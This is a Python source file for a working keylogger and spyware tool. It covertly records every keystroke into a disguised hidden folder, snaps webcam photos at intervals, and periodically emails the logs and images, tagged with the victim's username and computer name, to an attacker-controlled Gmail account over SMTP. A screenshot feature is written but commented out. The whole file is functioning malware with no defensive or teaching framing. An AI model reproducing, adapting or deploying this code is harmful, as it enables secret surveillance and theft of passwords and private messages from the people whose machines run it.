from pynput.keyboard import Key, Listener
import logging
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

# webcam library
import cv2

# desktop screenshot library
#import pyscreenshot as ImageGrab

# ---- CONFIG ----------
LOG_BASEPATH = os.path.join(os.path.expanduser("~\\"), "winNTx86_x64")
LOG_WEBCAM = os.path.join(LOG_BASEPATH, "webcam")
LOG_SCREEN = os.path.join(LOG_BASEPATH, "screen")
LOG_FILENAME = os.path.join(LOG_BASEPATH, "log.txt")

# ------ SMTP ----------
SMTP_HOSTNAME = "smtp.gmail.com"
SMTP_USERNAME = "youremail@gmail.com"
SMTP_PASSWORD = "yourpassword"
SMTP_PORT     = "587"

# -------- REPORT ------
EMAIL_SENDER  = SMTP_USERNAME
EMAIL_RECIPIENT = SMTP_USERNAME

# -------- Time related ----------
report_period = 60 * 30
snap_period = 60 * 5
desktop_period = 10

# -------------------------------

last_report = time.time()
last_snap = time.time()
last_desktop = time.time()

line = ""
snaps = []
desktops = []

# create main dir if not available
if not os.path.exists(LOG_BASEPATH):
    os.makedirs(LOG_BASEPATH)

# create webcam dir if not available
if not os.path.exists(LOG_WEBCAM):
    os.makedirs(LOG_WEBCAM)

# create screenshot dir if not available
if not os.path.exists(LOG_SCREEN):
    os.makedirs(LOG_SCREEN)


logging.basicConfig(filename=LOG_FILENAME, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# -------------------------------
def sendReport():
    global last_report
    global snaps
    global desktops

    #print("sending report ....\n")

    message = MIMEMultipart()

    message['From'] = EMAIL_SENDER
    message['To'] = EMAIL_RECIPIENT
    message['Subject'] = "Log - " + os.environ["USERNAME"] + " [" + os.environ["COMPUTERNAME"] + "]"

    body = "Please find log in attachment"
    message.attach(MIMEText(body, 'plain'))

    # attach log file to email
    attachment = open(LOG_FILENAME, "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename=log.txt")

    message.attach(part)

    attachment.close()

    # attach webcam captures
    if len(snaps) > 0:
        for snap in snaps:
            if os.path.isfile(snap):
                snap_attachment = open(snap, "rb")

                snap_part = MIMEBase('application', 'octet-stream')
                snap_part.set_payload(snap_attachment.read())
                encoders.encode_base64(snap_part)
                snap_part.add_header('Content-Disposition', "attachment; filename=" + str(os.path.basename(snap)))

                message.attach(snap_part)

                snap_attachment.close()

    try:
        smtp_service = smtplib.SMTP(SMTP_HOSTNAME, SMTP_PORT)
        smtp_service.starttls();
        smtp_service.login(SMTP_USERNAME, SMTP_PASSWORD)

        smtp_service.sendmail(EMAIL_SENDER, EMAIL_RECIPIENT, message.as_string())
        smtp_service.quit()
    except smtplib.SMTPException:
        print("SMTPLIB exception")

    # clear file content
    log_handler = open(LOG_FILENAME, "w")
    log_handler.write("")
    log_handler.close()

    last_report = time.time()

# -------------------------------
def beautifyLine(line):
    line = line.replace("[Key.space]", " ")
    line = line.replace("[Key.shift_r]/", "?")

    return line
# -------------------------------
'''
def captureDesktop():
    global desktops
    global last_desktop

    screenshot = ImageGrab.grab(bbox=(0, 0, 500, 500))

    last_desktop = time.time()

    screenshot_filename = "screen_" + time.strftime("%Y%m%d_%H%M%S") + ".jpg"
    screenshot_fullpath = os.path.join(LOG_SCREEN, screenshot_filename)

    print(screenshot_fullpath)

    screenshot.save(screenshot_fullpath)

    desktops.append(screenshot_fullpath)
'''
# -------------------------------
def captureWebcam():
    global snaps
    global last_snap

    webcam = cv2.VideoCapture(0)

    if webcam.isOpened():
        # wait to calibrate cam
        #time.sleep(0.2)

        # capture image from webcam
        retval, frame = webcam.read()

        # release webcam
        webcam.release()

        last_snap = time.time()

        # convert frame to rgb
        frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

        # build snap file
        snap_filename = "cam_" + time.strftime("%Y%m%d_%H%M%S") + ".jpg"
        snap_fullpath = os.path.join(LOG_WEBCAM, snap_filename)

        cv2.imwrite(snap_fullpath, frame_rgb)

        snaps.append(snap_fullpath)
# -------------------------------

def onKeyPress(key):
    global line
    global last_report, last_snap, last_desktop
    global report_period, snap_period, desktop_period

    # stop condition
    if line.find("log.stop") >= 0:
        sendReport()
        #print("STOP")
        return False

    # log line when Enter is pressed
    if key == Key.enter:
        logging.info(beautifyLine(line))
        line = ""
    else:
        try:
            line += str(key.char)
        except AttributeError:
            line += "[" + str(key) + "]"

    # take desktop screenshot at certain interval
    #if time.time() - last_desktop >= desktop_period:
    #    captureDesktop()

    # take webcam screenshot at certain interval
    if time.time() - last_snap >= snap_period:
        #print("capture webcam ...")
        captureWebcam()

    # send report at certain interval
    if time.time() - last_report >= report_period:
        #print("Sending report ...")
        sendReport()


# -------------------------------

with Listener(on_press=onKeyPress) as listener:
    listener.join()
